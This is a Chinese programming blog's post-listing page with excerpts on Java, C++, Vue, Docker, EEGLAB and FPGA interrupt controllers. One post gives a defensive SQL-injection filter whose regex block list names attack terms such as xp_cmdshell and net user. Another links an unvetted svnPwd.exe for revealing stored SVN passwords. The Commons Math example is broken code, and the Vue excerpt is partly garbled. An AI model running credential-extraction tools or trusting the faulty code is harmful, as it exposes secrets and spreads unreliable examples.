<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e8a58f71bace3beeb95d635e83a3a7c3/" rel="bookmark">
			Java中的Apache Commons Math是什么？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java中的Apache Commons Math是一个开源的数学库，它提供了许多常用的数学函数和算法，例如线性代数、微积分、统计、插值、拟合等。这个库对于需要处理大量数据的开发者来说非常有用，因为它可以大大简化代码并提高效率。
让我们从新手的角度来看一下这个库的使用。首先，你需要将Apache Commons Math添加到你的项目中。如果你使用Maven，可以在pom.xml文件中添加以下依赖：
&lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-math3&lt;/artifactId&gt; &lt;version&gt;3.6.1&lt;/version&gt; &lt;/dependency&gt; 接下来，你可以使用库中的函数来处理数据。以下是一个简单的例子，演示如何使用Apache Commons Math计算两个向量的点积：
import org.apache.commons.math3.linear.*; public class VectorDotProduct { public static void main(String[] args) { Vector&lt;Double&gt; vector1 = new Vector&lt;&gt;(1.0, 2.0, 3.0); Vector&lt;Double&gt; vector2 = new Vector&lt;&gt;(4.0, 5.0, 6.0); double dotProduct = dotProduct(vector1, vector2); System.out.println("Dot product: " + dotProduct); } public static double dotProduct(Vector&lt;Double&gt; v1, Vector&lt;Double&gt; v2) { double dotProduct = 0.0; for (int i = 0; i &lt; v1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e8a58f71bace3beeb95d635e83a3a7c3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7c0aa396e2d86ce19fef95149cf8cbd/" rel="bookmark">
			【Java 多线程】【CAS问题】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、CAS 是什么 Compare and Swap 比较并交换，这是一种并发算法，用于多线程环境下的原子操作
操作：内存中有原数据 A ，旧的预期值 B 和 新的预期值 C
比较 A 和 B 是否相等 (比较)如果比较相等，将B写入A； （交换）放回操作是否成功 2、CAS 实现 CAS 操作时原子性的，因此在多个线程并发执行 CAS 操作时，只有一个线程能成功执行CAS 操作，CAS 操作 是一条 CPU 指令（靠CPU支持），保证了原子性 针对不同的操作系统，JVM 用到了不同的 CAS 实现原理；
ava 的 CAS 利用的的是 unsafe 这个类提供的 CAS 操作；unsafe 的 CAS 依赖了的是 jvm 针对不同的操作系统实现的 Atomic::cmpxchg；Atomic::cmpxchg 的实现使用了汇编的 CAS 操作，并使用 cpu 硬件提供的 lock 机制保证其原子性。 硬件的支持，软件才能做到 CAS
2.1 实现原子性 标准库中提供了 java.util.concurrent.atomic 包, 里面的类都是基于这种方式来实现的.
例如：AtomicInteger 类. 其中的 getAndIncrement 相当于 i++ 操作.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d7c0aa396e2d86ce19fef95149cf8cbd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eceea7052e818a7db8c27d57d4cc0296/" rel="bookmark">
			星空时钟c&#43;&#43;
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include&lt;stdlib.h&gt; #include&lt;stdio.h&gt; #include&lt;easyx.h&gt; #include&lt;time.h&gt; #define SX 640 #define SY 400 struct Star { int x; int y; int v; bool use; }star[SY]; void initstar() { initgraph(SX,SY); srand(time(NULL)); for(unsigned short i=0;i&lt;SY;i++) { star[i].use=false; } return; } void creat() { for(unsigned short i=0;i&lt;SY;i++) { if(!star[i].use) { star[i].use=true; star[i].x=0; star[i].y=rand()%SY; star[i].v=rand()%4+1; break; } } return; } void move() { for(unsigned short i=0;i&lt;SY;i++) { if(star[i].use) { star[i].x+=star[i].v; if(star[i].x&gt;=SX) { star[i].use=false; } } } return; } void draw() { unsigned short i; for(i=0;i&lt;SY;i++) { if(star[i].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eceea7052e818a7db8c27d57d4cc0296/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f6873ef4b6f1cd87a13c96a8c6ff5aa/" rel="bookmark">
			eeglab（自用）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.加载、显示数据
2.绘制脑电头皮图 3.绘制通道光谱图
4.预处理工具
5.ICA去除伪迹
5. 提取数据epoch
1.加载、显示数据 观察事件值(Event values)：该数据集中包含2400个事件，每个事件指定了EEG.event结构的字段Type(类型)、position(位置)和latency(延迟)。
如果是.set文件类型，直接File-&gt;Load existing dataset。
浏览EEG通道数据(并可视化)：Plot &gt; Channel data (scroll).
绘图窗口右侧是垂直刻度值(及其单位，微伏),它指示垂直刻度条的"幅度"。在这种情况下，该值为4217(微伏)。右下角的编辑框中也显示了相同的值，如下所示，我们可以在其中进行更改。
通过重复单击"-"按钮或通过键盘编辑文本值，可以修改"刻度"编辑文本框的值，然后按Enter键更新滚动窗口。
在eegplot()界面中，Settings &gt; Zoom off/on &gt; Zoom on。然后使用鼠标，在数据区域周围拖动一个矩形以放大它。滚动窗口现在看起来可能与下面的窗口类似。单击鼠标右键再次缩小。Setting &gt; Zoom off/on &gt; Zoom off 可以关闭缩放。
绘制网格线：Display &gt; Grid &gt; X grid on来绘制水平线，设置Display &gt; Grid &gt; Y grid on设置纵轴线。重复相应操作的话，就可以关闭对应的网格线。
2.绘制脑电头皮图 加载通道位置信息：Edit&gt;Channel locations
此时，已加载的通道标签和极坐标显示在下面界面(pop_chanedit.m窗口)中，建议使用默认设置。[绘制在头部动画外部的电极是位于头部中线以下的电极(即，负z(高度)坐标，0是头部的中心.按照惯例，它们被绘制在头部卡通的外面。想要仅在头部动画中绘制头皮图，就需要在"Plot radius"编辑框中输入0.5。在这种情况下，当计算用于显示或9在某些情况下)进一步处理的插值二维头皮图时，将不显示或不考虑两个眼睛电极。这些设置用于在eeglab中绘制的所有头皮地形图。也可以将此对话框设置为1.0，以进行插值并显示包括所有可能的头皮通道位置的头皮图，并且头的部分在(0.5)头部赤道下方，显示在卡通头部边界外的 'skirt' 或 'halo'区域中（更精确地控制要绘制的通道位置可从命令行获得：请参阅头皮图绘图功能topoplot.m的"Help"。)]
可视化通道位置：Plot &gt; Channel location &gt; By name
也可以绘制成数字形式（数字对应的是通道号）：Plot &gt; Channel location &gt; By number
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f6873ef4b6f1cd87a13c96a8c6ff5aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b09dc8db5988eea90f6e67dee150bb0b/" rel="bookmark">
			C&#43;&#43; 一行代码删除string字符串中的“\n“、“\r“、“\t“ 和 所有空白字符
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这篇博客记录如何删除C++字符串中的回车、换行、制表符和所有的空白字符！
方式一 示例：
std::string str = "\n\r\t abc \n\t\r cba \r\t\n"; std::cout &lt;&lt; str &lt;&lt; std::endl; 运行截图：
使用remove_if进行移除：
#include &lt;cctype&gt; #include &lt;algorithm&gt; std::string str = "\n\r\t abc \n\t\r cba \r\t\n"; str.erase(std::remove_if(str.begin(), str.end(), ::isspace), str.end()); std::cout &lt;&lt; str &lt;&lt; std::endl; ::isspace 标识空白字符 运行截图：
效果明显看得出来！ 方式二 #include &lt;iostream&gt; #include &lt;string&gt; #include &lt;algorithm&gt; #include &lt;locale&gt; #include &lt;functional&gt; std::string s = " \n\r\t Hello \r\t\n\n World \n\r\t "; s.erase(std::remove_if(s.begin(), s.end(), std::bind(std::isspace&lt;char&gt;, std::placeholders::_1, std::locale::classic())), s.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b09dc8db5988eea90f6e67dee150bb0b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f14e405a27a3e92edb3592504770659/" rel="bookmark">
			AXI Interrupt Controller (INTC)中断控制器IP核 - 一般使用模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		AXI Interrupt Controller (INTC)中断控制器IP核 - 一般使用模式 逻辑部分 LogiCORE IP AXI 中断控制器(INTC)核心接收来自外围设备的多个中断输入，并将它们合并为系统处理器的中断输出。用于存储中断向量地址、检查、启用和确认中断的寄存器可以通过 AXI4-lite 接口访问。
特征 通过 AXI4-Lite界面进行登记。快速中断模式。支持最多32次中断。可级联以提供额外的中断输入。总线或单中断输出。中断请求之间的优先级由向量位置决定。最低有效位(LSB，在本例中为位0)具有最高的优先级中断启用寄存器选择性地启用单个中断输入。主启用寄存器以启用中断请求输出。（可以选择所有的中断是否输出）每个输入都可以根据边缘或水平灵敏度进行配置。输出中断请求引脚可配置为边缘或水平生成。可配置的软件中断能力。支持嵌套中断。硬件和软件向后兼容。 方框图 寄存器块: 此块包含控制寄存器和状态寄存器。它们通过 AXI4-lite 从接口访问。有关 AXI INTC核心寄存器的详细说明，请参阅寄存器空间。中断检测: 此块检测中断输入。它可以为每个中断输入配置电平检测或边缘检测。中断生成: 此块执行以下功能: 从中断控制器核心生成最终输出中断。中断灵敏度由配置参数决定。检查控制寄存器(MER 和 IER)中是否存在中断生成的启用条件。确认后重置中断。在 IVR 寄存器中写入活动中断的向量地址，并为挂起的中断启用 IPR 寄存器。 1 边缘敏感型和电平敏感型 边缘敏感性:当中断输入出现活动边缘且中断条件不存在时，记录一个新的中断条件。(活动边缘的极性，上升或下降，是每个输入选项。)无论是否启用中断，中断都会被记录下来，并被保留到确认为止。在此期间任何活动边缘都没有效果。级别敏感:当输入处于活动级别且中断条件不存在时，记录一个中断条件。(活动电平的极性，高或低，是每个输入的选项。)无论是否启用中断，中断都会被记录下来，即使在此期间输入电平变为非活动状态，中断也会被保留，直到被确认为止在边缘敏感中断的情况下，信号必须采样非活跃的一个时钟周期，然后活跃一个处理器时钟周期被检测。在电平敏感中断的情况下，信号必须采样至少活跃一个时钟周期才能被检测到。 2 快速中断模式 通过在中断模式寄存器(IMR)中设置相应的位来启用快速中断模式。中断向量地址取自相应的 IVAR 或 IVEAR寄存器，并通过 interrupt_address 端口发送给处理器。这使得处理器可以直接跳转到中断处理上。在快速中断模式下配置的中断通过处理器驱动的 processor_ack 端口得到确认。生成的 IRQ 被基于processor_ack 信号进行清除，并在processor_ack接收到后更新相应的 IAR 位。 3 级联模式 当系统需要超过32个中断时，有必要扩展 AXI INTC 核心能力来处理更多的中断。这可以通过实例化一个或多个额外的内核，并相应地设置级联模式参数来实现。
4 软件中断 该核心还支持数量可配置的软件中断，这些软件中断主要用于多处理器系统中的处理器间中断。这些中断是由写入中断状态寄存器的软件触发的。
5 嵌套中断 核心通过实现一个中断级别寄存器为嵌套中断提供支持。这可以被软件用来防止在处理中断时发生低优先级中断，从而允许在中断处理期间启用中断以立即获得高优先级中断。软件必须保存和恢复中断级别寄存器和返回地址。
因为在使用快速中断模式时，处理器直接跳转到唯一的中断向量地址来服务特定的中断，所以用户本身必须保存和恢复中断级别寄存器和返回地址。在正常中断模式下，这由软件驱动程序处理。
寄存器空间 Interrupt Status Register (ISR)中断状态寄存器 该寄存器中每一位可设置为一个中断状态，0为无中断，1为有中断可以通过软件生成中断，即寄存器中有效位数 = 硬件中断数 + 软件中断数ISR 中的位与 IER 中的中断启用位无关。剩余位的数量的软件中断数由 Vivado Design Suite (参数 C_NUM_SW_INTR)的数量定义。 Interrupt Pending Register (IPR)中断挂起寄存器 这是 AXI INTC 中的一个可选只读寄存器，可以在 Vivado Design Suite Customize IP 对话框中通过选中 Enable Interrupt Pending Register (参数C_HAS_IPR)来设置。读取这个寄存器的内容表明是否存在同样启用的活动中断。这个寄存器通过将 INTC 的读取次数减少一次来减少中断处理延迟。这个寄存器中的每个位是 ISR 和 IER 中位的逻辑 AND。如果中断输入少于数据总线的宽度，则读取不存在的中断将返回零。 Interrupt Enable Register (IER)中断启用寄存器 这是一个读写寄存器。在这个寄存器中写入一个1到一个位将启用相应的 ISR 位，从而允许它影响 irq 输出。当中断被禁用时，中断事件会发生，但不会传递给处理器。禁用活动中断可以防止该中断影响 irq 输出，但是一旦重新启用该中断，该中断立即设置irq 输出。中断必须通过写入（Interrupt Acknowledge Register）中断确认寄存器来清除。 Interrupt Acknowledge Register (IAR)中断确认寄存器 IAR 是一个只写寄存器，用于清除与所选中断相关联的中断请求。在 IAR 中将1写入一个位将清除 ISR 中的相应位，并且还将清除 IAR 中的位本身。在快速中断模式下，IAR 中的位将通过使用 Processing_ ack 端口的信息自动清除。在正常的中断模式下，通过 AXI 接口写入寄存器来清除 IAR 中的位。在 IAR 中将1写入位位置，清除由相应的中断输入生成的中断请求。通过在 IER 中对相应位写入一个0而使中断将保持激活状态，直到通过确认它而被清除。 Set Interrupt Enables (SIE)设置中断启用 SIE 用于在单个比特位设置 IER 位，而不是使用读-修改-写序列。在 SIE 中写入一个1到一个位置会在 IER 中设置相应的位。SIE 在 AXI INTC 核心中是可选的，可以通过在 Vivado Design Suite Customize IP 对话框(参数 C_HAS_SIE)中选择 Enable Set Interrupt Enable Register 来启用。 Clear Interrupt Enables (CIE)清除中断启用 CIE 是用于在单个原子操作中清除 IER 位，而不是使用读-修改-写序列。在 CIE 中写入1到位位置将清除 IER 中的相应位。CIE 在 AXI INTC 核心中是可选的，可以通过在 Vivado Design Suite Customize IP 对话框(参数 C_HAS_CIE)中选择 Enable Clear Interrupt Enable Register 来启用。 Interrupt Vector Register (IVR)中断向量登记册 IVR 是一个只读寄存器，包含最高优先级、启用和活动中断输入的序号值。 INT0(始终是LSB)是优先级最高的中断输入，左边的每个连续输入的中断优先级相应较低。 如果没有中断输入是活跃的，那么 IVR包含所有的中断输入。IVR 可作为正确中断向量地址的索引。 Master Enable Register (MER)主启用寄存器 这是一个2位读写寄存器。最低有效位包含主启用(ME)位，下一位包含硬件中断启用(HIE)位。 将1写入 ME 位使 Irq输出信号成为可能。将0写入 ME 位禁用 Irq 输出，有效地屏蔽所有中断输入。HIE 位是一个 write-once位。写入1也禁用对此位的任何进一步更改，直到发生重置。在重置时，HIE位被重置为0，允许软件写入 ISR以产生用于测试目的的硬件中断，并禁用任何硬件中断输入。写一个1到这个位使硬件中断输入和禁用软件生成的输入。但是，使用C_NUM_SW_INTR配置的任何软件中断依旧是可写的。 Interrupt Mode Register(IMR)中断模式寄存器 此寄存器只有在 Vivado Design Suite (参数 C_HAS_IMR)中的 Customize IP对话框中选择“启用快速中断模式逻辑”时才存在。IMR 寄存器用于设置连接的中断模式。通过在 IMR中设置相应的中断位置，可以单独配置所有中断。将0写入任意位，以正常中断模式处理相应的中断。将1写入任意位，以快速中断模式处理相应的中断。IMR寄存器中未使用的位位置返回零。 Interrupt Level Register (ILR)中断级别寄存器 中断级别寄存器(ILR)是一个读写寄存器，它包含阻止生成处理器 IRQ 的最高优先级中断的序号值。ILR 提供了一种阻塞低优先级中断的方法，以支持嵌套中断处理。当 ILR 为0时，不允许中断生成 IRQ，当 ILR 为1时，只允许 INT(0)生成 IRQ，等等。如果允许所有中断生成 IRQ，则 ILR 应该包含所有中断。 Interrupt Vector Address Register (IVAR)中断向量地址登记册 Interrupt Vector Extended Address Register (IVEAR)中断向量扩展地址登记册 这些是读写寄存器，其数量由 Vivado Design Suite (参数 C_NUM_INTR_INPUTS 和 C_NUM_SW_INTR)中的 Customize IP 对话框中的外围中断数量软件中断数量定义。这些寄存器只有在选择了“启用快速中断逻辑”(参数 C_HAS_FAST)时才可用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6f14e405a27a3e92edb3592504770659/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/36f2f8a40170c27d8aae53b3a3884e40/" rel="bookmark">
			kinbana discover 定时自动刷新
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0e7e781b8438aea609c11a0423933181/" rel="bookmark">
			2023最新前端vue面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2023最新前端vue面试题——基础版’ 1、vue的优点？
（1）轻量级框架；
（2）简单易学；
（3）双向数据绑定；
（4）组件化；
（5）视图、数据、结构分离；
（6）虚拟DOM；
（7）运行数据更快。
2、vue父组件向子组件传递数据？
通过props
3、子组件向父组件传递事件？
$emit方法
4、v-show和v-if指令的共同点和不同点？
共同点：都能控制元素的显示和隐藏。
不同点：v-show本质就是通过控制css中的display设置为none；v-if是动态地向DOM树内添加或者删除DOM元素。
5、如何让CSS只在当前组件中起作用？
在组件中的style前面加上scoped。
6、keep-alive的作用是什么？
keep-alive是Vue内置的一个组件，可以使被包含的组件保留状态，避免重新渲染。
7、如何获取dom？
ref=‘domName’
this.$refs.domName
8、说说几种vue中的指令和它的用法？
v-model:双向数据绑定；
v-for:循环；
v-if和v-show:显示与隐藏；
v-on:绑定事件；
v-once:只绑定一次。
9、vue-loader是什么？使用它的用途有哪些？
vue文件的一个加载器，将template\js\style转换成js模块。
用途：js可以写成es6、style样式可以scss或者less、template可以加jade等。
10、为什么使用key？
需要使用key来给每个节点做一个唯一标识，Diff算法就可以正确识别此节点。
作用主要是为了高效的更新虚拟dom。
11、axios的安装及其使用？
axios是请求后台资源模块。
npm install axios --save装好。
js中使用import引进来，然后.get或者.post。如果成功返回在.then函数中，失败则是在.catch函数中。
12、v-model的使用？
v-model用于表单数据的双向绑定，其实它就是一个语法糖，这个背后就做了两个操作：
（1）v-bind绑定一个value属性；
（2）v-on给当前元素绑定input事件。
13、请说出vue.cli项目中src目录每个文件夹和文件的用法？
main.js是入口文件；
app.vue是一个应用主组件；
components是放组件；
router是定义路由相关的配置；
assets文件夹是放静态资源。
14、computed和watch的使用场景？
computed：当一个属性受多个属性影响的时候就需要用到computed。最典型的例子：购物车商品结算的时候。
watch：当一条数据影响多条数据的时候就需要用watch。例子：搜索数据。
15、v-on可以监听多个方法吗？
可以
**16、 n e x t T i c k 的使用 ∗ ∗ 当我们修改了 d a t a 的值后马上获取这个 d o m 元素的值，是不能获取到更新后的值的，这个时候需要使用 nextTick的使用** 当我们修改了data的值后马上获取这个dom元素的值，是不能获取到更新后的值的，这个时候需要使用 nextTick的使用∗∗当我们修改了data的值后马上获取这个dom元素的值，是不能获取到更新后的值的，这个时候需要使用nextTick回调，
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0e7e781b8438aea609c11a0423933181/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8e4c230c24c5dd1217ad8014cab8ea4/" rel="bookmark">
			03.查看 SVN 账号密码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、找到svn存放目录 本地存放SVN用户信息的目录为：C:\Users\perke\AppData\Roaming\Subversion\auth\svn.simple
如果找不到直接搜索svn.simple（需要时间）
二、下载密码查看工具 链接: https://pan.baidu.com/s/1RpSpZp04eSnAkvZXqsakqA
提取码: etng
复制这段内容后打开百度网盘手机App，操作更方便哦
解压将svnPwd.exe文件放到svn.simple目录下，双击执行即可
原文转自：https://blog.csdn.net/m0_45170483/article/details/127123690
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fd582b0c48249259a811bd0d08560c20/" rel="bookmark">
			Uncaught TypeError: (0 , vuex__WEBPACK_IMPORTED_MODULE_0__.default) is not a function
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Uncaught TypeError: (0 , vuex__WEBPACK_IMPORTED_MODULE_0__.default) is not a function 解决思路：
1、先找到报错的文件；
2、寻找报错文件中所引入的文件。
错误图片展示：
ps：
出现这种错误一般是引用的文件名是否加上{}的问题，
有的文件名是需要加上花括号的，有的不需要。
未添加时：
添加后：
控制台输出将不会报错：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/555ac081a6a5ea3dd2434c8b02148056/" rel="bookmark">
			防SQL注入过滤器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import lombok.extern.slf4j.Slf4j; import org.springframework.stereotype.Component; import javax.servlet.*; import javax.servlet.annotation.WebFilter; import javax.servlet.annotation.WebInitParam; import javax.servlet.http.HttpServletRequest; import java.io.IOException; import java.util.Iterator; import java.util.Map; import java.util.regex.Matcher; import java.util.regex.Pattern; @Slf4j @Component @WebFilter(urlPatterns = "/*", filterName = "SQLInjection", initParams = {@WebInitParam(name = "regex", value = "(?:')|(?:--)|(/\\*(?:.|[\\n\\r])*?\\*/)|" + "(\\b(and|exec|execute|insert|select|delete|update|count|drop|%|chr|mid|master|truncate|char|declare|sitename|net user|xp_cmdshell|or|like'|and|exec|execute|insert|create|drop|table|from|grant|use|group_concat|column_name|information_schema.columns|table_schema|union|where|select|delete|update|order|by|count|chr|mid|master|truncate|char|declare|or|--|like)\\b)")}) public class SqlInjectFilter implements Filter { private String regx; @Override public void init(FilterConfig filterConfig) throws ServletException { this.regx = filterConfig.getInitParameter("regex"); } @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException { HttpServletRequest req = (HttpServletRequest) servletRequest; Map parametersMap = servletRequest.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/555ac081a6a5ea3dd2434c8b02148056/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af6f84071fac8ec1ec8d0b5c4f33ab4c/" rel="bookmark">
			Docker快速入门：安装及配置镜像仓库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Docker简介 Docker是一个开源的应用容器引擎；是一个轻量级容器技术；
Docker支持将软件编译成一个镜像；然后在镜像中各种软件做好配置，将镜像发布出去，其他使用者可以直接使用这个镜像；
运行中的这个镜像称为容器，容器启动是非常快速的。
特点
灵活:即使是最复杂的应用程序也可以被封装。
轻量级:容器利用和共享主机内核，使它们在系统资源方面比虚拟机更高效。
可移植性:您可以在本地构建、部署到云，并在任何地方运行。
松散耦合:容器是高度自给自足和封装的，允许您替换或升级一个容器而不破坏其他容器。
可伸缩:您可以增加并自动跨数据中心分发容器副本。
安全:容器对进程应用主动约束和隔离，而不需要用户进行任何配置。
2.Docker安装及卸载 Docker官网安装手册：Install Docker Engine on CentOS | Docker Documentation
首先需要满足上述系统要求
卸载旧版本
sudo yum remove docker \ docker-client \ docker-client-latest \ docker-common \ docker-latest \ docker-latest-logrotate \ docker-logrotate \ docker-engine 下载安装包
sudo yum install -y yum-utils 设置国内镜像仓库
yum-config-manager \ --add-repo \ https://download.docker.com/linux/centos/docker-ce.repo #国外的地址 # 设置阿里云的Docker镜像仓库 yum-config-manager \ --add-repo \ https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo #阿里云地址 更新安装包
yum makecache fast #centos8中为 yum makecache 安装docker及相关配置
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/af6f84071fac8ec1ec8d0b5c4f33ab4c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/94475238408e72d963542a16be7bbedf/" rel="bookmark">
			【c&#43;&#43;】VSCode配置 c&#43;&#43; 环境（小白教程）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		重新写了一个帖子，大家移步这里：【c++】VSCode配置 c++ 环境（重新制作）_StudyWinter的博客-CSDN博客
前言 这篇文章是笔者最开始学习使用vs code配置c/c++环境，第一次配置的时候，没有问题，但是评论区有小伙伴配置不成功，笔者又照着这个教程重新配置了一下。没有问题。于是乎，想着再写一篇文章重新说明一下，但是又觉得没必要，这里把重要的点提一下。
1 下载软件 MinGW-w64官网下载还是很慢的，这里贴上百度云链接
链接：https://pan.baidu.com/s/1MEc98YJBkVjdF5ruWznlZg 提取码：1q0i
在安装过程中如果网络不好，尝试利用手机热点安装，多试几次。
安装完之后测试
2 三个文件的配置 c_cpp_properties.jsonlaunch.jsontasks.json 2.1 c_cpp_properties.json 首先查看自己的includepath路径。在cmd下输入
gcc -v -E -x c++ - 结果
我们需要的是我框出来这部分的路径。接下是是重要的部分。
将【includePath】和【path】按照自己的路径修该。注意，这两部分是一样的。
上图我框了6行，直接将这前5行粘到后面，需要修改的是第1、2行（应该和顺序无关，方便称呼），即
"D:/mingw64_GCC8.1/mingw64/include/**", "D:/mingw64_GCC8.1/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../include", 第一个路径是需要自己查的。找到自己安装的mingw
然后第二个照着修改成自己的路径即可。
最终修改
{ "configurations": [ { "name": "Win32", "includePath": [ "${workspaceRoot}", // 以下7行需要修改 "D:/mingw64_GCC8.1/mingw64/include/**", "D:/mingw64_GCC8.1/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../include", // 将查询结果直接粘进来 "D:/mingw64_GCC8.1/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++", "D:/mingw64_GCC8.1/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++/x86_64-w64-mingw32", "D:/mingw64_GCC8.1/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include/c++/backward", "D:/mingw64_GCC8.1/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include", "D:/mingw64_GCC8.1/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/include-fixed" ], "defines": [ "_DEBUG", "UNICODE", "__GNUC__=6", "__cdecl=__attribute__((__cdecl__))" ], "intelliSenseMode": "msvc-x64", "browse": { "limitSymbolsToIncludedHeaders": true, "databaseFilename": "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/94475238408e72d963542a16be7bbedf/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/35dccf1f61149d08e306e2f74f66c3ad/" rel="bookmark">
			Origin单独修改柱状图颜色
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用Origin绘图时，往往会遇到修改一个柱子的颜色，别的柱状也跟着变色，解决办法：
将鼠标移动到单一柱状，按住Ctrl，再双击，就可以单独对柱状进行配色！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ea10dd41b587e1b2aac6083b3077cac/" rel="bookmark">
			2023华为OD统一考试（B卷）题库清单（持续收录中）以及考点说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 华为OD在线刷题OJ华为OD统一考试A卷+B卷 新题库说明ACM输入输出模式机考代码查重2023华为OD统一考试（B卷） - 100分值2023华为OD统一考试（B卷） - 200分值 华为OD在线刷题OJ 全新华为OD在线刷题平台登场！解锁上岸华为OD的终极秘籍！
亲爱的华为OD候选人们，你们期待已久的刷题平台终于来了！全新的华为OD机试在线刷题平台已经上线，为你们提供了一个全新的学习和提升华为OD机考编程技能的机会！无论你是初学者还是有经验的程序员，相信这个平台将成为你们上岸华为OD的终极秘籍！
【华为OD在线刷题OJ-点击立即开始刷题】
华为OD统一考试A卷+B卷 新题库说明 2023年5月份，华为官方已经将的 2022/0223Q(1/2/3/4)统一修改为OD统一考试（A卷）和OD统一考试（B卷）。
你收到的链接上面会标注A卷还是B卷。请注意：根据反馈，目前大部分收到的都是B卷。但是仍有概率抽到A卷。
A卷对应2023的新题库（2022Q4 20223Q1） B卷对应20022部分考题以及新出的题目
专栏：2023华为OD机试(A卷+B卷)（C++JavaJSPy）
专栏：2023华为OD机试(A卷)（C++ Java JS Py）
专栏：2023华为OD机试(B卷)（C++ Java JS Py）
ACM输入输出模式 如果你经常使用Leetcode,会知道letcode是不需要编写输入输出函数的。但是华为OD机考使用的是 ACM 模式，需要手动编写输入和输出。
